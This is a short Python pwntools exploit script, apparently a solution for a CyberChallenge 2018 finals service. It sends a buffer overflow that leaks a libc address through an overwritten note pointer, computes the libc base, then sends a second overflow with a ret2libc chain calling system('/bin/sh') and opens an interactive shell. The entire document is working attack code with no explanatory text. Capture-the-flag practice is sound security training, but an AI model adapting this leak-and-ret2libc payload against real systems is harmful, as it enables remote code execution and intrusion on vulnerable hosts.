from pwn import *
 
def main():
	r = remote('2018.finals.cyberchallenge.ru', 11002)
	libc = ELF('libc.so.6')
 
	r.recvuntil("> ")
	r.sendline("1")
	r.recvuntil(':')
 
	p = ''
	p += 'A' * 64
	p += p32(0x804a00c)
	r.send(p)
 
	r.recvuntil('> ')
	r.sendline('2')
	r.recvuntil("Your note: ")
	libc_leak = u32(r.recv(4))
	libc_base = libc_leak - libc.symbols['read']
 
	print 'libc_leak', hex(libc_leak)
	print 'libc_base', hex(libc_base)
 
	r.recvuntil('> ')
    	
	p = ''
	p += 'A' * 84
	p += p32(libc_base + libc.symbols['system'])
	p += 'XXXX'
	p += p32(libc_base + next(libc.search('/bin/sh\0')))
	r.sendline('1')
	r.recvuntil(':')
	r.send(p)
 
	r.interactive()
 
if __name__ == '__main__':
	main()